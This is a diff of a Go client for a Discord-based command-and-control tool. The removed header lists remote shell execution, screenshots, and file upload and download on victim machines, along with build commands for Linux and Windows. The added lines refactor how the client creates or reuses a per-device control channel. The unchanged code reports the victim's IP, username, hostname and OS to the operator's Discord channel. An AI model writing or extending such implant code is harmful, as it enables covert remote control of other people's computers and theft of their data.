@@ -1,16 +1,3 @@
-// Discord C2
-// William Moody
-// 08.12.2022
-
-// 🏃‍♂️ <command>      - Run the given command (Windows: cmd.exe, Other: bash)
-// 📸                - Take a screenshot
-// 👇 <path>         - Download the given file (Less than 8MB)
-// ☝️ <path> *attach - Upload the attached file (Less than 8MB)
-// 💀                - Kill the process
-
-// Linux   - GOOS=linux GOARCH=amd64 go build client.go
-// Windows - GOOS=windows GOARCH=amd64 go build client.go
-
 package main
 
 import (
@@ -28,6 +15,7 @@ import (
 	"github.com/bwmarrin/discordgo"
 )
 
+// main initializes the Discord session and opens or reuses a per-device control channel.
 func main() {
 	loadEnvFile(".env")
 	guildID = os.Getenv("DISCORD_GUILD_ID")
@@ -76,20 +64,15 @@ func main() {
 	if err != nil {
 		return
 	}
-	channelName := fmt.Sprintf("%s-%s-%s",
+	channelName := fmt.Sprintf("%s-%s",
 		strings.ToLower(hostname),
 		strings.ToLower(currentUser.Username),
-		strings.ReplaceAll(ipStr, ".", "-"),
 	)
-	c, err := dg.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
-		Name:     channelName,
-		Type:     discordgo.ChannelTypeGuildText,
-		ParentID: categoryID,
-	})
+	channelID, err := getOrCreateDeviceChannel(dg, categoryID, channelName)
 	if err != nil {
 		return
 	}
-	myChannelId = c.ID
+	myChannelId = channelID
 
 	// Send first message with basic info (and pin it)
 	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
